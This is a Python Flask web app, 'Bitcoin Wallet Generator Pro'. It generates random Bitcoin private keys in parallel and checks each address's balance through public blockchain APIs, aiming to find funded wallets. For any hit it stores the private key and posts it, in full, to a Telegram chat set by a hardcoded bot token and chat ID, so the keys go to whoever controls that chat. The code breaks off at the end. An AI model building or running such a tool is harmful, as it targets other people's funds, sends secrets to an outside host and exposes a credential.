import time
import threading
import hashlib
import ecdsa
import base58
import os
import requests
import json
import sqlite3
import secrets
import concurrent.futures
from datetime import datetime, timedelta
from flask import Flask, render_template_string, jsonify, request
from flask_socketio import SocketIO, emit
import logging
from concurrent.futures import ThreadPoolExecutor
import queue
import psutil

# ⚙️ Advanced Configuration
CONFIG = {
    'server': {
        'port': 5000,
        'host': '0.0.0.0',
        'debug': False
    },
    'generation': {
        'request_delay': 0.5,  # Faster generation
        'max_workers': 4,      # Parallel workers
        'batch_size': 10,      # Generate in batches
        'max_console_lines': 2000,
        'auto_save_interval': 100  # Auto-save every 100 wallets
    },
    'files': {
        'wallet_file': 'btc_wallets.txt',
        'database_file': 'wallets.db',
        'log_file': 'generator.log',
        'config_file': 'config.json'
    },
    'telegram': {
        'token': "8179575092:AAF8neI5SRmghulxlyjuKTVDEutqnHcPURI",
        'chat_id': "7521446360",
        'enabled': True
    },
    'apis': {
        'primary': 'https://blockchain.info/balance?active=',
        'secondary': 'https://blockstream.info/api/address/',
        'backup': 'https://api.blockcypher.com/v1/btc/main/addrs/',
        'timeout': 15,
        'retry_count': 3
    },
    'wallet_types': {
        'legacy': True,      # P2PKH (1...)
        'segwit': True,      # P2SH-P2WPKH (3...)
        'bech32': True       # P2WPKH (bc1...)
    }
}

# Initialize Flask with SocketIO for real-time updates
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(16)
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables
running = False
paused = False
console_output = []
generation_queue = queue.Queue()
result_queue = queue.Queue()
worker_threads = []

# Enhanced Statistics
stats = {
    "wallets_generated": 0,
    "wallets_with_balance": 0,
    "total_btc_found": 0.0,
    "start_time": None,
    "runtime": "00:00:00",
    "generation_rate": 0.0,
    "success_rate": 0.0,
    "api_calls": 0,
    "api_errors": 0,
    "last_found": None,
    "session_best": 0.0,
    "workers_active": 0,
    "memory_usage": 0.0,
    "cpu_usage": 0.0,
    "network_status": "Unknown",
    "wallet_types": {
        "legacy": 0,
        "segwit": 0,
        "bech32": 0
    }
}

# Database setup
def init_database():
    """Initialize SQLite database for wallet storage"""
    conn = sqlite3.connect(CONFIG['files']['database_file'])
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT UNIQUE NOT NULL,
            private_key TEXT NOT NULL,
            balance REAL NOT NULL,
            wallet_type TEXT NOT NULL,
            found_date DATETIME DEFAULT CURRENT_TIMESTAMP,
            api_source TEXT,
            block_height INTEGER,
            transaction_count INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS generation_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            wallets_generated INTEGER,
            wallets_found INTEGER,
            total_btc REAL,
            start_time DATETIME,
            end_time DATETIME,
            duration INTEGER
        )
    ''')
    
    conn.commit()
    conn.close()

# Logging setup
def setup_logging():
    """Setup advanced logging"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(CONFIG['files']['log_file']),
            logging.StreamHandler()
        ]
    )

def add_to_console(text, log_type="info", broadcast=True):
    """Enhanced console logging with real-time broadcasting"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    # Enhanced emoji system
    emoji_map = {
        "success": "✅", "error": "❌", "warning": "⚠️", "found": "💰",
        "generated": "🔐", "info": "ℹ️", "api": "🌐", "database": "💾",
        "telegram": "📱", "system": "⚙️", "performance": "📊",
        "network": "🔗", "security": "🛡️"
    }
    
    emoji = emoji_map.get(log_type, "ℹ️")
    log_line = f"[{timestamp}] {emoji} {text}"
    
    console_output.append({
        'timestamp': timestamp,
        'message': text,
        'type': log_type,
        'formatted': log_line
    })
    
    # Memory management
    if len(console_output) > CONFIG['generation']['max_console_lines']:
        console_output.pop(0)
    
    print(log_line)
    logging.info(f"{log_type.upper()}: {text}")
    
    # Real-time broadcast via SocketIO
    if broadcast:
        socketio.emit('console_update', {
            'message': log_line,
            'type': log_type
        })

def generate_legacy_address(private_key_hex):
    """Generate Legacy Bitcoin address (P2PKH - starts with 1)"""
    try:
        private_key_bytes = bytes.fromhex(private_key_hex)
        private_key = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
        public_key = private_key.get_verifying_key().to_string()
        
        # Create address
        sha256 = hashlib.sha256(public_key).digest()
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(sha256)
        public_key_hash = ripemd160.digest()
        
        versioned_payload = b'\x00' + public_key_hash
        checksum = hashlib.sha256(hashlib.sha256(versioned_payload).digest()).digest()[:4]
        binary_address = versioned_payload + checksum
        address = base58.b58encode(binary_address).decode('utf-8')
        
        return address, "legacy"
    except Exception as e:
        add_to_console(f"Legacy address generation error: {str(e)}", "error")
        return None, None

def generate_segwit_address(private_key_hex):
    """Generate SegWit address (P2SH-P2WPKH - starts with 3)"""
    try:
        private_key_bytes = bytes.fromhex(private_key_hex)
        private_key = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
        public_key = private_key.get_verifying_key().to_string()
        
        # Create P2WPKH script
        sha256 = hashlib.sha256(public_key).digest()
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(sha256)
        public_key_hash = ripemd160.digest()
        
        # P2WPKH script: OP_0 + 20-byte pubkey hash
        witness_script = b'\x00\x14' + public_key_hash
        
        # P2SH address
        script_hash = hashlib.new('ripemd160')
        script_hash.update(hashlib.sha256(witness_script).digest())
        script_hash_bytes = script_hash.digest()
        
        versioned_payload = b'\x05' + script_hash_bytes  # 0x05 for P2SH
        checksum = hashlib.sha256(hashlib.sha256(versioned_payload).digest()).digest()[:4]
        binary_address = versioned_payload + checksum
        address = base58.b58encode(binary_address).decode('utf-8')
        
        return address, "segwit"
    except Exception as e:
        add_to_console(f"SegWit address generation error: {str(e)}", "error")
        return None, None

def bech32_polymod(values):
    """Internal function that computes what bech32 polymod is"""
    GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ value
        for i in range(5):
            chk ^= GEN[i] if ((top >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp):
    """Expand the HRP into values for checksum computation"""
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_verify_checksum(hrp, data):
    """Verify a checksum given HRP and converted data characters"""
    return bech32_polymod(bech32_hrp_expand(hrp) + data) == 1

def bech32_create_checksum(hrp, data):
    """Compute the checksum values given HRP and data"""
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp, data):
    """Compute a Bech32 string given HRP and data values"""
    CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data, frombits, tobits, pad=True):
    """General power-of-2 base conversion"""
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits):
            return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def generate_bech32_address(private_key_hex):
    """Generate Bech32 address (P2WPKH - starts with bc1)"""
    try:
        private_key_bytes = bytes.fromhex(private_key_hex)
        private_key = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
        public_key = private_key.get_verifying_key().to_string()
        
        # Create P2WPKH address
        sha256 = hashlib.sha256(public_key).digest()
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(sha256)
        public_key_hash = ripemd160.digest()
        
        # Convert to 5-bit groups for bech32
        converted = convertbits(public_key_hash, 8, 5)
        if converted is None:
            return None, None
            
        # Bech32 encode
        address = bech32_encode("bc", [0] + converted)
        return address, "bech32"
    except Exception as e:
        add_to_console(f"Bech32 address generation error: {str(e)}", "error")
        return None, None

def generate_btc_wallet():
    """Generate multiple Bitcoin wallet formats"""
    try:
        # Generate secure private key
        private_key_bytes = secrets.randbits(256).to_bytes(32, 'big')
        private_key_hex = private_key_bytes.hex()
        
        wallets = []
        
        # Generate different address types based on config
        if CONFIG['wallet_types']['legacy']:
            address, wallet_type = generate_legacy_address(private_key_hex)
            if address:
                wallets.append((address, private_key_hex, wallet_type))
                
        if CONFIG['wallet_types']['segwit']:
            address, wallet_type = generate_segwit_address(private_key_hex)
            if address:
                wallets.append((address, private_key_hex, wallet_type))
                
        if CONFIG['wallet_types']['bech32']:
            address, wallet_type = generate_bech32_address(private_key_hex)
            if address:
                wallets.append((address, private_key_hex, wallet_type))
        
        return wallets
        
    except Exception as e:
        add_to_console(f"Wallet generation error: {str(e)}", "error")
        return []

def check_btc_balance_advanced(address):
    """Advanced balance checking with multiple APIs and fallbacks"""
    apis = [
        {
            'name': 'Blockchain.info',
            'url': f"{CONFIG['apis']['primary']}{address}",
            'parser': lambda r: r.json().get(address, {}).get("final_balance", 0) / 100000000
        },
        {
            'name': 'Blockstream',
            'url': f"{CONFIG['apis']['secondary']}{address}",
            'parser': lambda r: (r.json().get("chain_stats", {}).get("funded_txo_sum", 0) - 
                                r.json().get("chain_stats", {}).get("spent_txo_sum", 0)) / 100000000
        },
        {
            'name': 'BlockCypher',
            'url': f"{CONFIG['apis']['backup']}{address}/balance",
            'parser': lambda r: r.json().get("balance", 0) / 100000000
        }
    ]
    
    stats["api_calls"] += 1
    
    for attempt in range(CONFIG['apis']['retry_count']):
        for api in apis:
            try:
                response = requests.get(
                    api['url'],
                    timeout=CONFIG['apis']['timeout'],
                    headers={'User-Agent': 'Mozilla/5.0 (Bitcoin Wallet Generator)'}
                )
                
                if response.status_code == 200:
                    balance = api['parser'](response)
                    add_to_console(f"Balance check via {api['name']}: {balance:.8f} BTC", "api", False)
                    return balance, api['name']
                elif response.status_code == 429:
                    add_to_console(f"Rate limited by {api['name']}", "warning", False)
                    time.sleep(5)
                    continue
                else:
                    add_to_console(f"{api['name']} error: HTTP {response.status_code}", "warning", False)
                    
            except requests.exceptions.RequestException as e:
                stats["api_errors"] += 1
                if attempt < CONFIG['apis']['retry_count'] - 1:
                    add_to_console(f"{api['name']} failed (attempt {attempt + 1}): {str(e)}", "warning", False)
                    time.sleep(2)
                    continue
                    
        time.sleep(1)  # Wait between API attempts
        
    return None, None

def save_wallet_to_database(address, private_key, balance, wallet_type, api_source):
    """Save found wallet to database"""
    try:
        conn = sqlite3.connect(CONFIG['files']['database_file'])
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO wallets 
            (address, private_key, balance, wallet_type, api_source)
            VALUES (?, ?, ?, ?, ?)
        ''', (address, private_key, balance, wallet_type, api_source))
        
        conn.commit()
        conn.close()
        add_to_console("Wallet saved to database", "database", False)
        return True
    except Exception as e:
        add_to_console(f"Database save error: {str(e)}", "error")
        return False

def send_telegram_notification_advanced(message, priority="normal"):
    """Enhanced Telegram notifications with priority and formatting"""
    if not CONFIG['telegram']['enabled']:
        return
        
    url = f"https://api.telegram.org/bot{CONFIG['telegram']['token']}/sendMessage"
    
    # Priority formatting
    if priority == "high":
        message = f"🚨 <b>HIGH PRIORITY</b> 🚨\n\n{message}"
    elif priority == "critical":
        message = f"🔥 <b>CRITICAL ALERT</b> 🔥\n\n{message}"
    
    payload = {
        "chat_id": CONFIG['telegram']['chat_id'],
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            add_to_console("Telegram notification sent", "telegram", False)
        else:
            add_to_console(f"Telegram error: HTTP {response.status_code}", "error")
    except Exception as e:
        add_to_console(f"Telegram error: {str(e)}", "error")

def update_system_stats():
    """Update system performance statistics"""
    try:
        stats["memory_usage"] = psutil.virtual_memory().percent
        stats["cpu_usage"] = psutil.cpu_percent()
        
        # Network status check
        try:
            response = requests.get("https://www.google.com", timeout=5)
            stats["network_status"] = "Online" if response.status_code == 200 else "Limited"
        except:
            stats["network_status"] = "Offline"
            
    except Exception as e:
        add_to_console(f"System stats error: {str(e)}", "error", False)

def worker_thread():
    """Enhanced worker thread for parallel processing"""
    while running:
        try:
            if paused:
                time.sleep(1)
                continue
                
            # Generate wallets in batch
            wallets = generate_btc_wallet()
            
            for address, private_key, wallet_type in wallets:
                if not running:
                    break
                    
                stats["wallets_generated"] += 1
                stats["wallet_types"][wallet_type] += 1
                
                # Check balance
                balance, api_source = check_btc_balance_advanced(address)
                
                if balance is not None:
                    if balance > 0:
                        # Found wallet with balance!
                        stats["wallets_with_balance"] += 1
                        stats["total_btc_found"] += balance
                        stats["last_found"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        if balance > stats["session_best"]:
                            stats["session_best"] = balance
                        
                        success_msg = f"FOUND {wallet_type.upper()} WALLET! Balance: {balance:.8f} BTC"
                        add_to_console(success_msg, "found")
                        add_to_console(f"Address: {address}", "found")
                        add_to_console(f"Private: {private_key[:12]}...{private_key[-6:]}", "security")
                        
                        # Save to database
                        save_wallet_to_database(address, private_key, balance, wallet_type, api_source)
                        
                        # Save to file
                        try:
                            with open(CONFIG['files']['wallet_file'], "a", encoding='utf-8') as f:
                                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                                f.write(f"Address: {address}\n")
                                f.write(f"Private Key: {private_key}\n")
                                f.write(f"Balance: {balance:.8f} BTC\n")
                                f.write(f"Type: {wallet_type}\n")
                                f.write(f"API Source: {api_source}\n")
                                f.write("-" * 60 + "\n\n")
                        except Exception as e:
                            add_to_console(f"File save error: {str(e)}", "error")
                        
                        # Enhanced Telegram notification
                        priority = "critical" if balance > 0.1 else "high"
                        telegram_msg = (
                            f"💰 <b>WALLET WITH BALANCE FOUND!</b>\n\n"
                            f"🔸 <b>Type:</b> {wallet_type.upper()}\n"
                            f"💰 <b>Balance:</b> {balance:.8f} BTC\n"
                            f"📍 <b>Address:</b> <code>{address}</code>\n"
                            f"🔑 <b>Private Key:</b> <code>{private_key}</code>\n"
                            f"🌐 <b>API Source:</b> {api_source}\n"
                            f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                            f"📊 <b>Generated:</b> {stats['wallets_generated']:,}\n"
                            f"🏆 <b>Session Best:</b> {stats['session_best']:.8f} BTC"
                        )
                        send_telegram_notification_advanced(telegram_msg, priority)
                        
                        # Broadcast via SocketIO
                        socketio.emit('wallet_found', {
                            'address': address,
                            'balance': balance,
                            'type': wallet_type,
                            'time': datetime.now().isoformat()
                        })
                
                # Auto-save progress
                if stats["wallets_generated"] % CONFIG['generation']['auto_save_interval'] == 0:
                    add_to_console(f"Generated {stats['wallets_generated']:,} wallets...", "performance")
                
            time.sleep(CONFIG['generation']['request_delay'])
            
        except Exception as e:
            add_to_console(f"Worker thread error: {str(e)}", "error")
            time.sleep(CONFIG['generation']['request_delay'] * 2)

def update_runtime_stats():
    """Update runtime and performance statistics"""
    if stats["start_time"]:
        start = datetime.strptime(stats["start_time"], "%Y-%m-%d %H:%M:%S")
        runtime = datetime.now() - start
        hours, remainder = divmod(int(runtime.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        stats["runtime"] = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        
        # Calculate generation rate
        total_seconds = runtime.total_seconds()
        if total_seconds > 0:
            stats["generation_rate"] = (stats["wallets_generated"] / total_seconds) * 60  # per minute
            
        # Calculate success rate
        if stats["api_calls"] > 0:
            stats["success_rate"] = ((stats["api_calls"] - stats["api_errors"]) / stats["api_calls"]) * 100

@app.route("/")
def index():
    """Enhanced web interface with real-time updates"""
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🚀 Bitcoin Wallet Generator Pro</title>
        <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white; min-height: 100vh; padding: 15px;
            }
            .container { max-width: 1400px; margin: 0 auto; }
            .header { text-align: center; margin-bottom: 25px; }
            .header h1 { font-size: 2.8em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
            .header .subtitle { font-size: 1.2em; opacity: 0.9; }
            
            .controls { 
                display: flex; justify-content: center; gap: 15px; margin-bottom: 25px;
                flex-wrap: wrap;
            }
            button { 
                padding: 12px 24px; border: none; border-radius: 8px; 
                font-size: 16px; font-weight: bold; cursor: pointer; 
                transition: all 0.3s ease; text-transform: uppercase;
                letter-spacing: 1px;
            }
            .btn-start { background: #27ae60; color: white; }
            .btn-stop { background: #e74c3c; color: white; }
            .btn-pause { background: #f39c12; color: white; }
            .btn-clear { background: #9b59b6; color: white; }
            .btn-export { background: #34495e; color: white; }
            button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
            
            .main-grid { 
                display: grid; 
                grid-template-columns: 1fr 400px; 
                gap: 25px; 
                margin-bottom: 25px;
            }
            
            .console-section { 
                background: rgba(0,0,0,0.8); 
                border-radius: 12px; 
                padding: 20px;
                min-height: 500px;
            }
            .console { 
                background: #000; color: #00ff00; padding: 15px; 
                height: 450px; overflow-y: auto; border-radius: 8px;
                font-family: 'Courier New', monospace; font-size: 13px;
                line-height: 1.4; border: 2px solid #333;
            }
            
            .stats-grid { 
                display: grid; 
                grid-template-columns: 1fr 1fr; 
                gap: 15px;
            }
            .stat-card { 
                background: rgba(255,255,255,0.1); 
                padding: 15px; border-radius: 8px; 
                text-align: center; backdrop-filter: blur(10px);
            }
            .stat-value { 
                font-size: 1.8em; font-weight: bold; 
                color: #f1c40f; margin-bottom: 5px;
            }
            .stat-label { font-size: 0.9em; opacity: 0.8; }
            
            .wallet-types { 
                display: grid; 
                grid-template-columns: repeat(3, 1fr); 
                gap: 10px; margin-top: 15px;
            }
            .wallet-type { 
                background: rgba(255,255,255,0.05); 
                padding: 10px; border-radius: 6px; 
                text-align: center;
            }
            
            .system-status { 
                background: rgba(255,255,255,0.1); 
                padding: 15px; border-radius: 8px; 
                margin-top: 15px;
            }
            .status-item { 
                display: flex; justify-content: space-between; 
                margin-bottom: 8px;
            }
            
            .found-wallets { 
                background: rgba(46, 204, 113, 0.2); 
                border: 2px solid #2ecc71; 
                border-radius: 8px; padding: 15px; 
                margin-top: 15px;
            }
            
            .status-indicator { 
                display: inline-block; width: 12px; height: 12px; 
                border-radius: 50%; margin-right: 8px;
            }
            .status-running { background: #27ae60; }
            .status-stopped { background: #e74c3c; }
            .status-paused { background: #f39c12; }
            
            @media (max-width: 768px) {
                .main-grid { grid-template-columns: 1fr; }
                .stats-grid { grid-template-columns: 1fr; }
                .controls { flex-direction: column; align-items: center; }
                button { width: 200px; }
            }
            
            .toast { 
                position: fixed; top: 20px; right: 20px; 
                background: #2ecc71; color: white; 
                padding: 15px 20px; border-radius: 8px; 
                z-index: 1000; transform: translateX(400px); 
                transition: transform 0.3s ease;
            }
            .toast.show { transform: translateX(0); }
            
            .performance-chart { 
                height: 100px; background: rgba(0,0,0,0.2); 
                border-radius: 8px; margin-top: 10px; 
                position: relative; overflow: hidden;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🚀 Bitcoin Wallet Generator Pro</h1>
                <p class="subtitle">Advanced multi-format wallet generation with real-time monitoring</p>
            </div>
            
            <div class="controls">
                <button class="btn-start" onclick="start()">▶️ Start Generation</button>
                <button class="btn-pause" onclick="pause()">⏸️ Pause</button>
                <button class="btn-stop" onclick="stop()">⏹️ Stop</button>
                <button class="btn-clear" onclick="clearConsole()">🧹 Clear Console</button>
                <button class="btn-export" onclick="exportData()">📥 Export Data</button>
            </div>
            
            <div class="main-grid">
                <div class="console-section">
                    <h3><span id="status-indicator" class="status-indicator status-stopped"></span>Live Console</h3>
                    <div class="console" id="console"></div>
                </div>
                
                <div class="stats-section">
                    <h3>📊 Real-time Statistics</h3>
                    
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-value" id="generated">0</div>
                            <div class="stat-label">Wallets Generated</div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-value" id="with_balance">0</div>
                            <div class="stat-label">With Balance</div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-value" id="btc_found">0.00000000</div>
                            <div class="stat-label">Total BTC Found</div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-value" id="runtime">00:00:00</div>
                            <div class="stat-label">Runtime</div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-value" id="rate">0.00</div>
                            <div class="stat-label">Wallets/min</div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-value" id="success_rate">0.00%</div>
                            <div class="stat-label">API Success Rate</div>
                        </div>
                    </div>
                    
                    <div class="wallet-types">
                        <div class="wallet-type">
                            <div id="legacy_count">0</div>
                            <div>Legacy (1...)</div>
                        </div>
                        <div class="wallet-type">
                            <div id="segwit_count">0</div>
                            <div>SegWit (3...)</div>
                        </div>
                        <div class="wallet-type">
                            <div id="bech32_count">0</div>
                            <div>Bech32 (bc1...)</div>
                        </div>
                    </div>
                    
                    <div class="system-status">
                        <h4>🖥️ System Status</h4>
                        <div class="status-item">
                            <span>CPU Usage:</span>
                            <span id="cpu_usage">0%</span>
                        </div>
                        <div class="status-item">
                            <span>Memory Usage:</span>
                            <span id="memory_usage">0%</span>
                        </div>
                        <div class="status-item">
                            <span>Network:</span>
                            <span id="network_status">Unknown</span>
                        </div>
                        <div class="status-item">
                            <span>Active Workers:</span>
                            <span id="workers_active">0</span>
                        </div>
                    </div>
                    
                    <div class="found-wallets" id="found_wallets" style="display: none;">
                        <h4>💰 Session Best: <span id="session_best">0.00000000</span> BTC</h4>
                        <div>Last Found: <span id="last_found">Never</span></div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="toast" id="toast"></div>

        <script>
            const socket = io();
            let isRunning = false;
            let isPaused = false;
            
            // Socket event handlers
            socket.on('console_update', function(data) {
                const console = document.getElementById('console');
                const div = document.createElement('div');
                div.innerHTML = data.message;
                div.className = data.type;
                console.appendChild(div);
                console.scrollTop = console.scrollHeight;
            });
            
            socket.on('wallet_found', function(data) {
                showToast(`💰 Found ${data.type} wallet with ${data.balance.toFixed(8)} BTC!`);
                document.getElementById('found_wallets').style.display = 'block';
            });
            
            function showToast(message) {
                const toast = document.getElementById('toast');
                toast.textContent = message;
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 5000);
            }
            
            function start() { 
                fetch('/start', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            isRunning = true;
                            isPaused = false;
                            updateStatusIndicator();
                        }
                    });
            }
            
            function pause() {
                fetch('/pause', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            isPaused = !isPaused;
                            updateStatusIndicator();
                        }
                    });
            }
            
            function stop() { 
                fetch('/stop', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            isRunning = false;
                            isPaused = false;
                            updateStatusIndicator();
                        }
                    });
            }
            
            function clearConsole() { 
                document.getElementById('console').innerHTML = '';
                fetch('/clear', { method: 'POST' }); 
            }
            
            function exportData() {
                window.open('/export', '_blank');
            }
            
            function updateStatusIndicator() {
                const indicator = document.getElementById('status-indicator');
                if (isRunning) {
                    if (isPaused) {
                        indicator.className = 'status-indicator status-paused';
                    } else {
                        indicator.className = 'status-indicator status-running';
                    }
                } else {
                    indicator.className = 'status-indicator status-stopped';
                }
            }
            
            // Update stats every second
            setInterval(() => {
                fetch('/get_stats').then(r => r.json()).then(data => {
                    document.getElementById('generated').textContent = data.wallets_generated.toLocaleString();
                    document.getElementById('with_balance').textContent = data.wallets_with_balance;
                    document.getElementById('btc_found').textContent = parseFloat(data.total_btc_found).toFixed(8);
                    document.getElementById('runtime').textContent = data.runtime;
                    document.getElementById('rate').textContent = data.generation_rate.toFixed(2);
                    document.getElementById('success_rate').textContent = data.success_rate.toFixed(2) + '%';
                    document.getElementById('cpu_usage').textContent = data.cpu_usage.toFixed(1) + '%';
                    document.getElementById('memory_usage').textContent = data.memory_usage.toFixed(1) + '%';
                    document.getElementById('network_status').textContent = data.network_status;
                    document.getElementById('workers_active').textContent = data.workers_active;
                    
                    // Wallet types
                    document.getElementById('legacy_count').textContent = data.wallet_types.legacy;
                    document.getElementById('segwit_count').textContent = data.wallet_types.segwit;
                    document.getElementById('bech32_count').textContent = data.wallet_types.bech32;
                    
                    if (data.session_best > 0) {
                        document.getElementById('session_best').textContent = data.session_best.toFixed(8);
                        document.getElementById('last_found').textContent = data.last_found || 'Never';
                        document.getElementById('found_wallets').style.display = 'block';
                    }
                });
            }, 1000);
        </script>
    </body>
    </html>
    ''', stats=stats, console_output=console_output)

# Enhanced API routes
@app.route("/start", methods=["POST"])
def start():
    """Start enhanced wallet generation"""
    global running, worker_threads
    
    if not running:
        running = True
        stats["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats["workers_active"] = CONFIG['generation']['max_workers']
        
        # Start multiple worker threads
        worker_threads = []
        for i in range(CONFIG['generation']['max_workers']):
            thread = threading.Thread(target=worker_thread, daemon=True)
            thread.start()
            worker_threads.append(thread)
        
        add_to_console("Advanced wallet generation started!", "success")
        add_to_console(f"Workers: {CONFIG['generation']['max_workers']}", "system")
        add_to_console(f"Wallet types: {', '.join([k for k, v in CONFIG['wallet_types'].items() if v])}", "system")
        
        # Enhanced start notification
        start_msg = (
            f"🚀 <b>BTC Generator Pro Started!</b>\n\n"
            f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"👥 <b>Workers:</b> {CONFIG['generation']['max_workers']}\n"
            f"🔄 <b>Delay:</b> {CONFIG['generation']['request_delay']}s\n"
            f"🏷️ <b>Types:</b> {', '.join([k for k, v in CONFIG['wallet_types'].items() if v])}"
        )
        send_telegram_notification_advanced(start_msg)
        
    return jsonify({"success": True})

@app.route("/pause", methods=["POST"])
def pause():
    """Pause/resume generation"""
    global paused
    paused = not paused
    
    status = "paused" if paused else "resumed"
    add_to_console(f"Generation {status}!", "warning")
    
    return jsonify({"success": True, "paused": paused})

@app.route("/stop", methods=["POST"])
def stop():
    """Stop wallet generation"""
    global running
    
    if running:
        running = False
        stats["workers_active"] = 0
        add_to_console("Advanced wallet generation stopped!", "warning")
        
        # Enhanced stop notification
        stop_msg = (
            f"🛑 <b>BTC Generator Pro Stopped</b>\n\n"
            f"📊 <b>Total Generated:</b> {stats['wallets_generated']:,}\n"
            f"💰 <b>Wallets Found:</b> {stats['wallets_with_balance']}\n"
            f"🔥 <b>Total BTC:</b> {stats['total_btc_found']:.8f}\n"
            f"🏆 <b>Session Best:</b> {stats['session_best']:.8f}\n"
            f"⏱️ <b>Runtime:</b> {stats['runtime']}\n"
            f"📈 <b>Rate:</b> {stats['generation_rate']:.2f} wallets/min"
        )
        send_telegram_notification_advanced(stop_msg)
        
    return jsonify({"success": True})

@app.route("/clear", methods=["POST"])
def clear():
    """Clear console output"""
    global console_output
    console_output = []
    add_to_console("Console cleared", "system")
    return jsonify({"success": True})

@app.route("/get_stats")
def get_stats():
    """Get enhanced statistics"""
    update_runtime_stats()
    update_system_stats()
    return jsonify(stats)

@app.route("/export")
def export_data():
    """Export found wallets data"""
    try:
        conn = sqlite3.connect(CONFIG['files']['database_file'])
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM wallets")
        wallets = cursor.fetchall()
        conn.close()
        
        output = "Bitcoin Wallet Generator Pro - Export\n"
        output += "=" * 50 + "\n\n"
        
        for wallet in wallets:
            output += f"ID: {wallet[0]}\n"
            output += f"Address: {wallet[1]}\n"
            output += f"Private Key: {wallet[2]}\n"
            output += f"Balance: {wallet[3]:.8f} BTC\n"
            output += f"Type: {wallet[4]}\n"
            output += f"Found: {wallet[5]}\n"
            output += f"API Source: {wallet[6]}\n"
            output += "-" * 30 + "\n\n"
        
        return output, 200, {
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename=wallets_export.txt'
        }
        
    except Exception as e:
        return f"Export error: {str(e)}", 500

# SocketIO events
@socketio.on('connect')
def handle_connect():
    emit('console_update', {'message': 'Connected to real-time updates', 'type': 'success'})

if __name__ == "__main__":
    # Initialize everything
    setup_logging()
    init_database()
    
    add_to_console("🚀 Bitcoin Wallet Generator Pro v2.0 initialized!", "success")
    add_to_console(f"Configuration loaded: {len(CONFIG)} sections", "system")
    add_to_console(f"Database initialized: {CONFIG['files']['database_file']}", "database")
    add_to_console(f"Telegram: {'Enabled' if CONFIG['telegram']['enabled'] else 'Disabled'}", "telegram")
    add_to_console(f"Worker threads: {CONFIG['generation']['max_workers']}", "performance")
    add_to_console(f"Wallet types: {sum(CONFIG['wallet_types'].values())} enabled", "system")
    
    # Start server
    try:
        socketio.run(
            app, 
            host=CONFIG['server']['host'], 
            port=CONFIG['server']['port'], 
